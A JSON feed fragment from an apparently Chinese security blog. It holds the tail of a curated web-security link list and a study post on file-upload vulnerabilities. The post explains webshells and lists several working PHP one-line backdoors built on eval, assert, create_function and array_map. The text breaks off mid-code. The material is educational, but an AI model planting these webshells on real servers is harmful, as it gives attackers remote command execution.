data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JoaW5vU2VjdXJpdHlMYWJz\">@RhinoSecurityLabs</span>.</li>\n</ul>\n<p><a name=\"practices-xss\"></a></p>\n<h3 id=\"xss-2\"><a class=\"anchor\" href=\"#xss-2\">#</a> XSS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3MtZ2FtZS5hcHBzcG90LmNvbS8=\">XSS game</span> - Google XSS Challenge - Written by Google.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3Byb21wdC5tbC8=\">prompt(1) to win</span> - Complex 16-Level XSS Challenge held in summer 2014 (+4 Hidden Levels) - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1Mw==\">@cure53</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hbGYubnUvYWxlcnQx\">alert(1) to win</span> - Series of XSS challenges - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zdGVpa2U=\">@steike</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3hzcy1xdWl6LmludDIxaC5qcC8=\">XSS Challenges</span> - Series of XSS challenges - Written by yamagata21.</li>\n</ul>\n<p><a name=\"practices-modsecurity\"></a></p>\n<h3 id=\"modsecurity-owasp-modsecurity-core-rule-set\"><a class=\"anchor\" href=\"#modsecurity-owasp-modsecurity-core-rule-set\">#</a> ModSecurity / OWASP ModSecurity Core Rule Set</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmV0bmVhLmNvbS9jbXMvYXBhY2hlLXR1dG9yaWFscy8=\">ModSecurity / OWASP ModSecurity Core Rule Set</span> - Series of tutorials to install, configure and tune ModSecurity and the Core Rule Set - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9DaHJGb2xpbmk=\">@ChrFolini</span>.</li>\n</ul>\n<h2 id=\"community\"><a class=\"anchor\" href=\"#community\">#</a> Community</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL3dlYnNlY3VyaXR5Lw==\">Reddit</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy90YWdnZWQvc2VjdXJpdHk=\">Stack Overflow</span></li>\n</ul>\n<h2 id=\"miscellaneous\"><a class=\"anchor\" href=\"#miscellaneous\">#</a> Miscellaneous</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RqYWRtaW4vYXdlc29tZS1idWctYm91bnR5\">awesome-bug-bounty</span> - Comprehensive curated list of available Bug Bounty &amp; Disclosure Programs and write-ups by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RqYWRtaW4=\">@djadmin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25nYWxvbmdjL2J1Zy1ib3VudHktcmVmZXJlbmNl\">bug-bounty-reference</span> - List of bug bounty write-up that is categorized by the bug nature by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25nYWxvbmdj\">@ngalongc</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3NpdGUvYnVnaHVudGVydW5pdmVyc2l0eS9iZWhpbmQtdGhlLXNjZW5lcy9wcmVzZW50YXRpb25zL2dvb2dsZS12cnAtYW5kLXVuaWNvcm5z\">Google VRP and Unicorns</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL2RhbmllbC1zdGVsdGVyLWdsaWVzZS0xNzBhNzBhMi8=\">Daniel Stelter-Gliese</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2RldmNvLnJlL2Jsb2cvMjAxNC8wNi8xOS9jbGllbnQtaXAtZGV0ZWN0aW9uLw==\">如何正確的取得使用者 IP ？</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2RldmNvLnJlL2Jsb2cvYXV0aG9yL2FsbGVub3du\">Allen Own</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1h5bnRheC8xMDAwcGhw\">1000php</span> - 1000 个 PHP 代码审计案例 (2016.7 以前乌云公开漏洞) by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1h5bnRheA==\">@Xyntax</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3B3bmRpenpsZS5ibG9nc3BvdC5qcC8yMDE0LzAyL2JydXRlLWZvcmNpbmcteW91ci1mYWNlYm9vay1lbWFpbC1hbmQuaHRtbA==\">Brute Forcing Your Facebook Email and Phone Number</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3B3bmRpenpsZS5ibG9nc3BvdC5qcC8=\">PwnDizzle</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2kuaW1ndXIuY29tL01yOXB2cTkuanBn\">Pentest + Exploit dev Cheatsheet wallpaper</span> - Penetration Testing and Exploit Dev CheatSheet.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jb3ZlcnQuaW8vdGhlLWRlZmluaXRpdmUtc2VjdXJpdHktZGF0YXNjaWVuY2UtYW5kLW1hY2hpbmVsZWFybmluZy1ndWlkZS8=\">The Definitive Security Data Science and Machine Learning Guide</span> - Written by JASON TROS.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3gwcnovRVFHUlA=\">EQGRP</span> - Decrypted content of eqgrp-auction-file.tar.xz by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3gwcno=\">@x0rz</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NoQUxrZVIvbm90ZXM=\">notes</span> - Some public notes by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NoQUxrZVI=\">@ChALkeR</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWJlbmdpbmVlcmluZy5jb20vZ2l0aHVicy1idWctYm91bnR5LXdvcmtmbG93Lw==\">A glimpse into GitHub's Bug Bounty workflow</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dyZWdvc2U=\">@gregose</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5tb3R0b2luLmNvbS8xMDY2ODcuaHRtbA==\">暗网系列之：利用 Dark Web Report + EyeWitness+ TorGhost +Docker，自动化获取暗网站点的信息</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5tb3R0b2luLmNvbS91c2VyL3lpbmcv\">鹰小编</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmVsZmVyY2VudGVyLm9yZy9DeWJlclBsYXlib29r\">Cybersecurity Campaign Playbook</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmVsZmVyY2VudGVyLm9yZy8=\">Belfer Center for Science and International Affairs</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JtdXNzZXIwMS9JbmZvc2VjX1JlZmVyZW5jZQ==\">Infosec_Reference</span> - Information Security Reference That Doesn't Suck by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JtdXNzZXIwMQ==\">@rmusser01</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2lvdHNjYW5uZXIuYnVsbGd1YXJkLmNvbS8=\">Internet of Things Scanner</span> - Check if your internet-connected devices at home are public on Shodan by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYnVsbGd1YXJkLmNvbS8=\">BullGuard</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMVZwUlQ4ZEZ5VGFGcFFhOWpoZWh0bUdhQzdUcVFuaU1TWWJVZGxITjZWclkvZWRpdD91c3A9c2hhcmluZw==\">The Bug Hunters Methodology v2.1</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9qaGFkZGl4\">@jhaddix</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3NpdGUvdGVzdHNpdGVoYWNraW5nLy03LTVrLUdvb2dsZS1zZXJ2aWNlcy1taXgtdXA=\">$7.5k Google services mix-up</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3NpdGUvdGVzdHNpdGVoYWNraW5nLw==\">Ezequiel Pereira</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLmRldGVjdGlmeS5jb20vMjAxOC8wMS8xMi9ob3ctaS1leHBsb2l0ZWQtYWNtZS10bHMtc25pLTAxLWlzc3VpbmctbGV0cy1lbmNyeXB0LXNzbC1jZXJ0cy1mb3ItYW55LWRvbWFpbi11c2luZy1zaGFyZWQtaG9zdGluZy8=\">How I exploited ACME TLS-SNI-01 issuing Let's Encrypt SSL-certs for any domain using shared hosting</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9mcmFuc3Jvc2Vu\">@fransrosen</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly92b2lkc2VjLmNvbS92cG4tbGVhay8=\">TL:DR: VPN leaks users’ IPs via WebRTC. I’ve tested seventy VPN providers and 16 of them leaks users’ IPs via WebRTC (23%)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly92b2lkc2VjLmNvbS8=\">voidsec</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3B0aXYuY29tL2Jsb2cvZXNjYXBlLWFuZC1ldmFzaW9uLWVncmVzc2luZy1yZXN0cmljdGVkLW5ldHdvcmtz\">Escape and Evasion Egressing Restricted Networks</span> - Written by <a href=\"info@optiv.com\">Chris Patten, Tom Steele</a>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0B1bXBveC9iZS1jYXJlZnVsLXdoYXQteW91LWNvcHktaW52aXNpYmx5LWluc2VydGluZy11c2VybmFtZXMtaW50by10ZXh0LXdpdGgtemVyby13aWR0aC1jaGFyYWN0ZXJzLTE4YjRlNmYxN2I2Ng==\">Be careful what you copy: Invisibly inserting usernames into text with Zero-Width Characters</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0B1bXBveA==\">@umpox</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2lncHduLmlvL2Jsb2cvMjAxOC80LzE0L2RvbWF0by1mdXp6ZXJzLWdlbmVyYXRpb24tZW5naW5lLWludGVybmFscw==\">Domato Fuzzer's Generation Engine Internals</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2lncHduLmlvLw==\">sigpwn</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXZvbmlkZS5jb20vc2lkZS1jaGFubmVsLWF0dGFja2luZy1icm93c2Vycy10aHJvdWdoLWNzczMtZmVhdHVyZXMv\">CSS Is So Overpowered It Can Deanonymize Facebook Users</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXZvbmlkZS5jb20v\">Ruslan Habalov</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvbnJhZ3VwYXRoeS9pbnRyb2R1Y3Rpb24tdG8td2ViLWFwcGxpY2F0aW9uLXNlY3VyaXR5LWJsYWNraG9vZGllLXVzLTIwMTg=\">Introduction to Web Application Security</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9pdHNDMHJnMQ==\">@itsC0rg1</span>, <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9qbWtlYWRz\">@jmkeads</span> and <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9tYXRpcg==\">@matir</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjanVpY2UuY29tL2ZpbmRpbmctcmVhbC1pcHMtb2Ytb3JpZ2luLXNlcnZlcnMtYmVoaW5kLWNsb3VkZmxhcmUtb3ItdG9yLw==\">Finding The Real Origin IPs Hiding Behind CloudFlare or TOR</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjanVpY2UuY29tL2F1dGhvci9wYXVsLWRhbm5ld2l0ei8=\">Paul Dannewitz</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXYudG8vYW50b2dhcmFuZC93aHktZmFjZWJvb2tzLWFwaS1zdGFydHMtd2l0aC1hLWZvci1sb29wLTFlb2I=\">Why Facebook's api starts with a for loop</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9BbnRvR2FyYW5k\">@AntoGarand</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmF2YXRhby5jb20vSG93LUktY291bGQtc3RlYWwteW91ci1waG90b3MtZnJvbS1Hb29nbGUv\">How I could have stolen your photos from Google - my first 3 bug bounty writeups</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9nZXJnb3R1cmNzYW55aQ==\">@gergoturcsanyi</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly8wZGF5LndvcmsvYW4tZXhhbXBsZS13aHktbmF0LWlzLW5vdC1zZWN1cml0eS8=\">An example why NAT is NOT security</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9AMGRheXdvcms=\">@0daywork</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZWNodm9taXQubmV0L3dlYi1hcHBsaWNhdGlvbi1wZW5ldHJhdGlvbi10ZXN0aW5nLW5vdGVzLw==\">WEB APPLICATION PENETRATION TESTING NOTES</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZWNodm9taXQubmV0Lw==\">Jayson</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWdtZW50LmNvbS9ibG9nL2hhY2tpbmctd2l0aC1hLWhlYWRzLXVwLWRpc3BsYXkv\">Hacking with a Heads Up Display</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWdtZW50LmNvbS9ibG9nL2F1dGhvcnMvZGF2aWQtc2Nyb2JvbmlhLw==\">David Scrobonia</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zbGFzaGNyeXB0by5vcmcvZGF0YS9pdHNlY3gyMDE4LnBkZg==\">Alexa Top 1 Million Security - Hacking the Big Ones</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zbGFzaGNyeXB0bw==\">@slashcrypto</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovLzEwZGVncmVzLm5ldC90aGUtYnVnLWJvdW50eS1wcm9ncmFtLXRoYXQtY2hhbmdlZC1teS1saWZlLw==\">The bug bounty program that changed my life</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovLzEwZGVncmVzLm5ldC8=\">Gwen</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0ZXIubGFuZC9saXN0LW9mLWJ1Zy1ib3VudHktd3JpdGV1cHMuaHRtbA==\">List of bug bounty writeups</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0ZXIubGFuZC8=\">Mariem</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90aHJlYXR2ZWN0b3IuY3lsYW5jZS5jb20vZW5fdXMvaG9tZS9pbXBsaWNhdGlvbnMtb2YtbG9hZGluZy1uZXQtYXNzZW1ibGllcy5odG1s\">Implications of Loading .NET Assemblies</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90aHJlYXR2ZWN0b3IuY3lsYW5jZS5jb20vZW5fdXMvY29udHJpYnV0b3JzL2JyaWFuLXdhbGxhY2UuaHRtbA==\">Brian Wallace</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZXN0ZXJucy50b2t5by93Y3RmMjAxOS1ndGYvd2N0ZjIwMTktZ3RmLXNsaWRlcy5wZGY=\">WCTF2019: Gyotaku The Flag</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS90MG5rNDI=\">@t0nk42</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnRjc2VjLmNvbS8yMDIwLzA0LzAxLXNsYWNrLXdlYnJ0Yy10dXJuLWNvbXByb21pc2Uv\">How we abused Slack's TURN servers to gain access to internal services</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zYW5kcm9nYXVjaQ==\">@sandrogauci</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL3dhbG1hcnRsYWJzL2Rvcy1maWxlLXBhdGgtbWFnaWMtdHJpY2tzLTVlZGE3YTdhODVmYQ==\">DOS File Path Magic Tricks</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BjbHIyb2Y4\">@clr2of8</span>.</li>\n</ul>\n<h2 id=\"code-of-conduct\"><a class=\"anchor\" href=\"#code-of-conduct\">#</a> Code of Conduct</h2>\n<p>Please note that this project is released with a <a href=\"code-of-conduct.md\">Contributor Code of Conduct</a>. By participating in this project you agree to abide by its terms.</p>\n<h2 id=\"license\"><a class=\"anchor\" href=\"#license\">#</a> License</h2>\n<p><a href=\"https://creativecommons.org/publicdomain/zero/1.0/\"><img data-src=\"http://mirrors.creativecommons.org/presskit/buttons/88x31/svg/cc-zero.svg\" alt=\"CC0\" /></a></p>\n<p>To the extent possible under law, <span class=\"exturl\" data-url=\"aHR0cHM6Ly9xYXpibm00NTYuZ2l0aHViLmlvLw==\">@qazbnm456</span> has waived all copyright and related or neighboring rights to this work.</p>\n",
            "tags": [
                "web安全",
                "web安全"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/12/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/",
            "url": "https://self-ferry.github.io/2021/01/12/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/",
            "title": "web漏洞-文件上传",
            "date_published": "2021-01-12T14:14:02.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<blockquote>\n<p>凯哥最近讲了文件上传漏洞，无事，想总结一下方便以后复习。大部分内容转载自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAzL2FydGljbGUvZGV0YWlscy8xMDQ4NTg3MDU=\"> https://blog.csdn.net/qq_43390703/article/details/104858705</span> 没办法写的太好了。就不重复造轮子了</p>\n</blockquote>\n<p>持续更新！</p>\n<h1 id=\"介绍文件上传漏洞\"><a class=\"anchor\" href=\"#介绍文件上传漏洞\">#</a> 介绍文件上传漏洞</h1>\n<blockquote>\n<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者 WebShell 等。“文件上传” 本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>\n</blockquote>\n<p>产生原因：</p>\n<ul>\n<li>对于上传文件的后缀名（扩展名）没有做较为严格的限制</li>\n<li>对于上传文件的 MIMETYPE (用于描述文件的类型的一种表述方法) 没有做检查</li>\n<li>权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于 shebang 类型的文件）</li>\n<li>对于 web server 对于上传文件或者指定目录的行为没有做限制</li>\n</ul>\n<p>原理：</p>\n<blockquote>\n<p>在 WEB 中进行文件上传的原理是通过将表单设为 multipart/form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上</p>\n</blockquote>\n<p>文件上传后导致的常见安全问题一般有:</p>\n<p>上传文件是 Web 脚本语言，服务器的 Web 容器解释并执行了用户上传的脚本，导致代<br />\n码执行；</p>\n<p>上传文件是 Flash 的策略文件 crossdomain.xml, 黑客用以控制 Flash 在该域下的行为 (其<br />\n他通过类似方式控制策略文件的情况类似);</p>\n<p>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:</p>\n<p>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执<br />\n行，被用于钓鱼和欺诈。</p>\n<p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块；或者上传 - 一个合法的文本文件， 其内容包含了 PHP 脚本，再通过 “本地文件包含漏洞 (Local File Include)&quot; 执行此脚本；等等。</p>\n<h1 id=\"有关文件上传的知识\"><a class=\"anchor\" href=\"#有关文件上传的知识\">#</a> 有关文件上传的知识</h1>\n<h2 id=\"webshell\"><a class=\"anchor\" href=\"#webshell\">#</a> webshell</h2>\n<p>什么是 webshell<br />\nWebShell 就是以 asp、php、jsp 或者 cgi 等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些 asp 或 php 后门文件与网站服务器 web 目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。 WebShell 后门隐蔽较性高，可以轻松穿越防火墙，访问 WebShell 时不会留下系统日志，只会在网站的 web 日志中留下一些数据提交记录</p>\n<h2 id=\"一句话木马\"><a class=\"anchor\" href=\"#一句话木马\">#</a> 一句话木马</h2>\n<p>常用的 webshell 就是一句话木马，结合中国菜刀或者 hackbar 等工具可以很高效快捷的获得网站 shell。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>##PHP：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'r00ts'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token comment\">//?cmd=phpinfo() @preg_replace(\"/abc/e\",$_REQUEST['cmd'],\"abcd\"); </span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">//?cmd=phpinfo();</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$func</span> <span class=\"token operator\">=</span><span class=\"token function\">create_function</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">//?func=system&amp;cmd=whoami</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$func</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'func'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$array</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$new_array</span><span class=\"token operator\">=</span><span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$array</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">//print_r($new_array);</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">//?cmd=phpinfo()</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>@<span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span>assert<span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">//?cmd=phpinfo()</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$array</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token function\">call_user_func_array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"assert\"</span><span class=\"token 